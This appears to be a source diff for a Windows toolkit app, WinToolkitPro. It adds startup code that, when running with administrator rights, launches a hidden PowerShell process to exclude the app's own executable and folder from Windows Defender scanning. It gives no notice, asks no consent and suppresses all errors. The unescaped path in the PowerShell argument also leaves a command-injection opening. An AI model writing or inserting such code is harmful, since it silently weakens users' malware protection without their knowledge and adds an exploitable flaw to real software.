@@ -85,6 +85,33 @@ public partial class MainViewModel : ObservableObject
         await SystemToolsVM.InitializeAsync();
         await DriversVM.InitializeAsync();
 
+        // Auto-register Defender exclusion for WinToolkitPro to prevent 10-second cloud scan delay
+        if (IsAdministrator)
+        {
+            _ = Task.Run(() =>
+            {
+                try
+                {
+                    var exePath = Environment.ProcessPath ?? string.Empty;
+                    var exeName = System.IO.Path.GetFileName(exePath);
+                    var appDir = System.IO.Path.GetDirectoryName(exePath) ?? string.Empty;
+                    if (!string.IsNullOrEmpty(exeName))
+                    {
+                        var psi = new System.Diagnostics.ProcessStartInfo
+                        {
+                            FileName = "powershell.exe",
+                            Arguments = $"-NoProfile -WindowStyle Hidden -Command \"try {{ Add-MpPreference -ExclusionProcess '{exeName}' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '{appDir}' -ErrorAction SilentlyContinue }} catch {{}}\"",
+                            CreateNoWindow = true,
+                            UseShellExecute = false
+                        };
+                        using var p = System.Diagnostics.Process.Start(psi);
+                        p?.WaitForExit(4000);
+                    }
+                }
+                catch { }
+            });
+        }
+
         // Check for App updates in background
         _ = CheckForAppUpdatesAsync();
     }
